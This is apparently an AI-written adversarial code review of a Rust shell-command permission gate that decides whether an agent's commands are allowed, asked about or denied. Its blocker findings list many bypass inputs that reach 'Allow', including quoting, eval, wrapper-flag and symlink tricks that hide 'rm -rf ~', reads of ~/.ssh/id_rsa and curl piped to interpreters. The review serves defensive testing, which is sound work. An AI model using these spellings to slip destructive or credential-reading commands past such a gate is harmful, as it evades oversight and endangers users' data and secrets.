# Review: M1-13-adversarial, fifth round (commit 5a8c57c)

Reviewer: Gemini 4 Hydrogen `high`, read-only (D-080). Author: Claude Opus 5.5. Saved verbatim by the orchestrator from the agent's final message, minus its title; the `file://` links point at the worker's worktree. The previous two reviews were copied into the worktree's git-ignored `.orchestration/review-input/` for this run.

**Verdict: rework**

Every input from both previous reviews now matches its expected verdict across all four settings, `clippy` is clean, `cargo test -p atrium-core --no-fail-fast` passes, and `adversarial_fuzz` finishes in `12.46s`. However, attacking the fifth-round changes turned up **7 security blockers** (inputs touching sensitive paths or bypassing hard denies that reach `Allow`, including `~/**/id_work` and `find -L` on a linked `~/.ssh` folder, nested `$(...)` inside `"${...}"`, `function`/`coproc` inside piped compound commands, `exec -ca` / `caffeinate -it` / `flock` post-file flags, `$(which python3)` in `substituted_word_may_be_shell`, and pipelined `eval`/`source` dropping `~` across `&&`), plus **1 major** family of false hard denies on ordinary `cd X && <compound> && Y` lines.

---

## Findings

### Blockers (inputs reaching `Allow` on sensitive paths or bypassing hard denies)

#### 1. [blocker] `glob_reaches` matches `**` as a single component, allowing `cat ~/**/id_work` on a linked `~/.ssh` folder (`gate.rs:389-423`)
In [gate.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/gate.rs#L389-L423), `glob_reaches` zips `pat` and `rel` 1-to-1 (`pat.iter().zip(&rel).take(n).all(...)`), treating `**` as matching only one directory level instead of zero or more. When `~/.ssh/work -> ~/vault/work` (`rel = ["vault", "work"]` from `~`), `cat ~/**/id_work` has `pat = ["**", "id_work"]`, so `pat[1]` (`"id_work"`) is matched against `rel[1]` (`"work"`) and returns `false`. `real_path` also fails to canonicalize `~/**`, so `reaches_linked_ssh_dir` misses it completely.

Observed empirically via `SessionGate` (`~/.ssh/work -> ~/vault/work` containing `vault/work/id_work`, settings `[home, any, full]`):
- `cat ~/**/id_work` (`cwd = ~`) → **`["Ask", "Allow", "Allow"]`** (expected `Deny(credential-read)` in all 3 settings)

#### 2. [blocker] `searches_cwd` misses `find -L`/`-H` and `ag`/`ack` with value-taking flags (`gate.rs:332-351`)
In [gate.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/gate.rs#L332-L351):
1. `"find"` only inspects `args.first()`, explicitly returning `false` when the first arg is `"-H" | "-L" | "-P"`. Commands like `find -L`, `find -L -print`, `find -H -ls`, and `find -L -exec cat {} +` have no path root (so `shell::find_roots` defaults them to `"."`), yet `searches_cwd` returns `false`.
2. `"ag" | "ack"` checks `args.iter().filter(|a| !a.starts_with('-')).count() <= 1`, so any option taking a separate value (`-C 3`, `-A 5`, `-G pat`) makes `operands() >= 2` and returns `false` when run from a parent directory such as `vault`.

Observed empirically via `SessionGate` (`~/.ssh/work -> ~/vault/work`, settings `[home, any, full]`):
- `cd vault && find -L` → **`["Ask", "Allow", "Allow"]`**
- `cd vault && find -L -print` → **`["Ask", "Allow", "Allow"]`**
- `cd vault && find -H -ls` → **`["Ask", "Allow", "Allow"]`**
- `cd vault && find -L -exec cat {} +` → **`["Ask", "Allow", "Allow"]`**
- `find -L`, `find -L -print` (with `cwd = vault`) → **`["Ask", "Allow", "Allow"]`**
- `find -L` (with `cwd = vault/work`) → **`["Ask", "Allow", "Allow"]`**
- `cd vault && ag -C 3 x`, `ag -C 3 x` (`cwd = vault`) → **`["Ask", "Allow", "Allow"]`**
- `cd vault && ack -C 3 x`, `ack -C 3 x` (`cwd = vault`) → **`["Ask", "Allow", "Allow"]`**

#### 3. [blocker] `"${...}"` inside double quotes desynchronizes on quotes inside nested `$(...)` / `` `...` `` (`shell.rs:208-269`)
In [shell.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L208-L269), `scan_dollar_brace` does not skip `$(...)` (`scan_paren`) or `` `...` `` (`scan_backtick`). In `echo "${x:-$(echo '"')}" ; rm -rf ~`, `in_dq` is `true` so `'` is ignored, and the `"` inside `$(echo '"')` opens a double-quoted scan inside `scan_dollar_brace` that swallows the closing `}` (`closed = false`). `ambiguous_tail` ([shell.rs:259-269](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L259-L269)) then slices `rest` after the first `}` (`"\" ; rm -rf ~"`), whose leading `"` swallows `; rm -rf ~` inside an unterminated quote when `rest` is lexed.

Observed empirically (`[home, prefix, any, full]`):
- `echo "${x:-$(echo '"')}" ; rm -rf ~` → **`["Ask", "Ask", "Allow", "Allow"]`** (expected `Hard(recursive-delete-outside-cwd)`)
- `echo "${x:-$(echo '"')}" ; cat .ssh/id_rsa` → **`["Ask", "Ask", "Allow", "Allow"]`** (expected `Hard(credential-read)`)
- `echo "${x:-"$(echo '"')"}" ; rm -rf ~` → **`["Ask", "Ask", "Allow", "Allow"]`** (expected `Hard(recursive-delete-outside-cwd)`)
- ``echo "${x:-`echo '"'`}" ; rm -rf ~`` → **`["Ask", "Ask", "Allow", "Allow"]`** (expected `Hard(recursive-delete-outside-cwd)`)

#### 4. [blocker] `function <name> { ... }` and `coproc { ... }` inside piped compound commands pop the outer pipe group (`shell.rs:772-798`)
In [shell.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L772-L798), `command_position` only allows `cur.argv` words in `then | do | else | elif | ! | { | if | while | until | time`. When `function f { ... }` or `coproc { ... }` appears inside a piped compound command, the inner `{` is not in `command_position` and fails to push onto `groups`; its closing `}` then pops the outer piped group, leaving a subsequent `sh` with `pipe = 0, piped = false`.

Observed empirically (`[home, prefix, any, full]`):
- `echo 'rm -rf ~' | { function f { true; }; sh; }` → **`["Ask", "Ask", "Allow", "Allow"]`**
- `echo 'rm -rf ~' | if true; then function f { true; }; sh; fi` → **`["Ask", "Ask", "Allow", "Allow"]`**
- `echo 'rm -rf ~' | { coproc { true; }; sh; }` → **`["Ask", "Ask", "Allow", "Allow"]`**
- `echo 'rm -rf ~' | if true; then coproc { true; }; sh; fi` → **`["Ask", "Ask", "Allow", "Allow"]`**

#### 5. [blocker] Wrapper short-option clusters (`exec -ca`, `caffeinate -it`, `ionice -tc`, `xargs -tI`) and `flock`/`script` flag gaps (`shell.rs:1173-1347`)
In [shell.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L1173-L1347):
1. `skip` (`exec`, `caffeinate`, `ionice`, `stdbuf`, `timeout`, `xargs`, `time`) only matches exact `flags_with_value` tokens and never parses short-option clusters ending in a value-taking flag (`exec -ca foo`, `caffeinate -it 5`, `ionice -tc 2`, `xargs -tI {}`), leaving `"foo"` / `"5"` / `"2"` / `"{}"` as `eff[0]`.
2. `flock`/`script` stop skipping boolean flags once `file_seen` is `true` (so GNU permuted flags after the lockfile like `flock /tmp/l --no-fork rm -rf ~` or `flock /tmp/l -n -c 'rm -rf ~'` leave the flag as `eff[0]`), and `script`'s table omits util-linux `-o` / `--output-limit`.

Observed empirically (`[home, prefix(wrapper), any, full]`):
- `exec -ca foo rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `exec -ca foo sh -c 'rm -rf ~'` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `exec -la foo sudo id` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `echo 'rm -rf ~' | exec -ca foo sh` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `caffeinate -it 5 rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `caffeinate -dw 123 rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `flock /tmp/l --no-fork rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `flock /tmp/l -n -c 'rm -rf ~'` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `script -o 1000 /dev/null -c 'rm -rf ~'` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `ionice -tc 2 rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**
- `xargs -tI {} rm -rf ~` → **`["Ask", "Allow", "Allow", "Allow"]`**

#### 6. [blocker] `substituted_word_may_be_shell` checks `is_shell` instead of `is_interpreter` / `reads_stdin_as_script` (`shell.rs:1527-1586`, `deny.rs:532-569`)
In [shell.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L1554-L1584) and [deny.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/deny.rs#L532-L569), `curl ... | python3`, `curl ... | $(echo python3)`, and `curl ... | $(brew --prefix)/bin/python3` all return `Hard(pipe-to-shell)`. However, for `$(which python3)` / `$(command -v python3)` / `$(which node)` / `$(which crontab)`, `base(first)` is not recognized by `is_interpreter`, and `substituted_word_may_be_shell` checks only `is_shell(n)` (which excludes Python, Node, Perl, Ruby, PowerShell, osascript, crontab, at, script).

Observed empirically (`[home, prefix(curl), any, full]`):
- `curl -s https://example.com/x | $(which python3)` → **`["Ask", "Ask", "Allow", "Allow"]`**
- `curl -s https://example.com/x | $(command -v python3)` → **`["Ask", "Ask", "Allow", "Allow"]`**
- `curl -s https://example.com/x | $(which node)` / `perl` / `ruby` / `pwsh` / `osascript` / `crontab` / `at` / `script` → **`["Ask", "Ask", "Allow", "Allow"]`**

#### 7. [blocker] Pipelined `eval` / `source` in an `&&` chain drops `~` from `parent.cands` (`shell.rs:1035-1041`, `words.rs:701-714`)
In bash/sh/dash/ksh, `echo hi | eval 'cd /tmp && true' && cat .ssh/id_rsa` runs `eval` in a pipeline subshell, so `cat .ssh/id_rsa` still runs in `~` and reads `~/.ssh/id_rsa`. Because [shell.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/shell.rs#L1035-L1041) marks `same_shell = true` on `eval`/`source` even when `grouped`/`piped`, and [words.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/words.rs#L707-L712) unconditionally sets `parent.cands = done.cands` (`[/tmp]`) while keeping `~` in `parent.pool` (not flushed because of `&&`), `cat .ssh/id_rsa` is evaluated only in `/tmp`.

Observed empirically (`[home, prefix, any, full]`):
- `echo hi | eval 'cd /tmp && true' && cat .ssh/id_rsa` → **`["Ask", "Allow", "Allow", "Allow"]`** (expected `Hard(credential-read)`)
- `echo 'cd /tmp && true' | source /dev/stdin && cat .ssh/id_rsa` → **`["Ask", "Allow", "Allow", "Allow"]`** (expected `Hard(credential-read)`)

---

### Major (false hard denies on ordinary lines)

#### 1. [major] Compound statements inside an `&&` chain flush `lv.pool` mid-chain (`words.rs:793-796`, `shell.rs:378-399`)
Internal `;` inside `while ...; do ...; done`, `if ...; then ...; fi`, `{ ...; }`, `for ...; do ...; done`, `case ...; esac`, and the `flush!()` at `)` in `(true)` emit `Join::Seq` before the trailing `&&`. In [words.rs](file:///Users/pedro/atrium-wt/M1-13-adversarial/crates/atrium-core/src/policy/words.rs#L793-L796), that internal `Join::Seq` sets `lv.pending = true`, flushing `~` from `lv.pool` back into `lv.cands` for the remainder of the `&&` chain even though the compound command only runs if `cd` succeeded. On `dev`, `words.rs` kept the `cd` target across all of these (`[Ask, Ask, Allow, Allow]`).

Observed empirically (`[home, prefix, any, full]`):
- `cd proj && while read l; do echo "$l"; done < f && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings
- `cd proj && if true; then echo ok; fi && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings
- `cd proj && { true; } && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings
- `cd build && if true; then true; fi && rm -rf *` → **`Hard(recursive-delete-outside-cwd)`** in all 4 settings
- `cd proj && for x in a b; do echo $x; done && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings
- `cd proj && case a in a) true;; esac && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings
- `cd proj && (true) && cat .npmrc` → **`Hard(credential-read)`** in all 4 settings

---

## Checklist Answers

### 1. Previous reviews' inputs across all settings
All named inputs from both `M1-13-adversarial-third-part.md` and `M1-13-adversarial-round4.md` were re-verified against `5a8c57c` (both via `adversarial_regression` / `adversarial_ordinary` and via a temporary test covering every raw command and `SessionGate` case from both reviews, deleted afterward):
- Round 3/4 blockers (`Grep` with empty `paths` in `vault/work`, `rgrep`, `cp -r` / `find -exec cat` / `rm -rf` / `cat vault/*/id_work` on linked `~/.ssh`, `"${x:-"'"}"`, nested `if`/`{}` in piped compound commands, `flock`/`script`/`env` clustered options, `crontab -uroot`, `cd ~-`/`~+1`/`-1`, `|| exit 1 &`, `env $(...)`/`nohup $(...)`) and all round-3 inputs now produce their expected `HardDeny` / `Deny` / `Ask` verdicts.
- Round 4 major (`cd X && ...` ending in `sh -c`/`eval`/`$(...)`/`find -exec`) matches `dev`'s `[Ask, Ask, Allow, Allow]` (and `env -C` keeps `dev`'s `HardDeny`).

### 2. Sensitive-path hunt around the new code
Detailed in **Blockers 1–7** above.

### 3. Ordinary-line false hard deny hunt
- **New `tree_walker` list without a linked folder in `~/.ssh`**: `ssh.linked_dirs` is empty so `reaches_linked_ssh_dir` returns `false` immediately. Tested `mv a b`, `tar czf /tmp/out.tgz src`, `zip -r /tmp/out.zip src`, `rsync -a src/ /tmp/dst/`, `cp -a src /tmp/dst`, `rm -r build`, `cp -r src /tmp/dst`, `ditto src /tmp/dst`: all `["Ask", "Allow", "Allow"]` (`Home`, `Any`, `FullAccess`).
- **With a linked folder `~/.ssh/work -> ~/vault/work`**:
  - Files outside `vault/work` (`mv vault/notes.txt /tmp/n`, `tar czf /tmp/src.tgz vault/notes.txt`, `rm -r vault/notes.txt`, `cp -a vault/notes.txt /tmp/n`, `rsync -a vault/notes.txt /tmp/n`) stay `["Ask", "Allow", "Allow"]`; `ls vault/work` and `rg x vault/notes.txt` stay `["Allow", "Allow", "Allow"]`; `ls vault/*` stays `["Ask", "Allow", "Allow"]`.
  - Any recursive search/archive rooted at an ancestor of `vault/work` (`rg x` from `~`, `tar czf /tmp/b.tgz ~`, `tar czf /tmp/b.tgz .` from `~`) is hard-denied (`Deny(credential-read)`), as documented in the handoff.
- **`substituted_word_may_be_shell`**: `curl -s https://example.com/data.json | $(brew --prefix)/bin/jq .`, `curl -s https://example.com/x | $(which less)`, `curl -s https://example.com/x | "$PAGER"`, `cat src/main.rs | "$PAGER"`, `git log | $(git var GIT_PAGER)` all return `["Ask", "Allow", "Allow"]` (no false hard deny).
- **Nesting changes**: `git log | while read l; do echo "$l"; done`, `git log | while read l; do if true; then echo "$l"; fi; done`, and `ls | for f in a b; do echo "$f"; done` return `["Ask", "Allow", "Allow"]`. However, putting a compound command inside an `&&` chain after `cd` causes false hard denies (see **Major 1**).

### 4. Convergence assessment
- **Mechanism vs. neighbours**: Six of the seven blockers (Blockers 1–5 and 7) are **direct neighbours** (same mechanism, new spelling) of the previous round's fixes: `**` in `glob_reaches`, `-L`/`-H`/`-C 3` in `searches_cwd`, `$(...)` inside `"${...}"` in `scan_dollar_brace`, `function`/`coproc` in `command_position`, short-option clusters/post-file flags in `unwrap`, and subshell/pipeline `same_shell` hand-back in `words::walk`. Blocker 6 (`is_shell` vs `is_interpreter`/`reads_stdin_as_script`) is an omission in the new `substituted_word_may_be_shell` helper. Major 1 is a consequence of the round-4/5 `&&`-pool flush on internal `;`/`flush!()` inside compound commands.
- **Will another round close the class?** **Yes, provided the next fixes generalize the mechanisms instead of adding single spellings**:
  1. Match `**` across zero or more components in `glob_reaches` (e.g. via `globset` on the suffix relative to `prefix`).
  2. Reuse `shell::find_roots` for `find` in `searches_cwd` and parse value-taking flags on `ag`/`ack`.
  3. Skip `$(...)` and `` `...` `` using `scan_paren`/`scan_backtick` inside `scan_dollar_brace`.
  4. Handle `coproc` and `function <name>` in `command_position`, and prevent internal `;` / `)` inside compound commands from triggering `lv.pending` mid-`&&` chain.
  5. Give `skip` in `unwrap` the same cluster-aware value-flag parsing used for `flock`/`script`/`env`, and allow post-file options on `flock`.
  6. Check `is_interpreter` and `reads_stdin_as_script` (alongside `is_shell`) in `substituted_word_may_be_shell`.
  7. Gate `same_shell` candidate replacement in `words::walk` on `!owner_unit.grouped` (unioning `parent.cands` when `grouped` instead of dropping `parent.cands` into `parent.pool`).

---

## 5. Checks Run

All commands ran in `/Users/pedro/atrium-wt/M1-13-adversarial` on commit `5a8c57c`; `git status --short` is clean after deleting the temporary verification test (`crates/atrium-core/tests/review_verify_tmp.rs`).

- `cargo clippy -p atrium-core --all-targets -- -D warnings` → exit `0` (`Finished dev profile ... in 2.28s`, 0 warnings).
- `cargo test -p atrium-core --no-fail-fast` → exit `0`:
  - `src/lib.rs`: 9 passed, 0 failed (`0.00s`)
  - `adversarial_fuzz`: 2 passed, 0 failed, 1 ignored (`M1-13 finding 11`) (`12.47s`)
  - `adversarial_gate`: 9 passed, 0 failed, 2 ignored (`finding_10`, `finding_11`) (`0.10s`)
  - `adversarial_ledger`: 14 passed, 0 failed (`0.15s`)
  - `adversarial_ordinary`: 8 passed, 0 failed (`0.02s`)
  - `adversarial_policy`: 15 passed, 0 failed, 3 ignored (`finding_4`, `finding_5`, `finding_6`)
  - `adversarial_regression`: 35 passed, 0 failed
  - `attention`: 8 passed, 0 failed
  - `history`: 9 passed, 0 failed (`0.00s`)
  - `ledger`: 20 passed, 0 failed (`0.02s`)
  - `policy`: 44 passed, 0 failed (`4.77s`)
  - `store`: 28 passed, 0 failed (`37.45s`)
  - `Doc-tests atrium_core`: 0 tests (`0.00s`)
- `cargo test -p atrium-core --test adversarial_fuzz` (standalone; `time` was blocked by worker command policy) → exit `0`: `2 passed; 0 failed; 1 ignored; finished in 12.46s`.

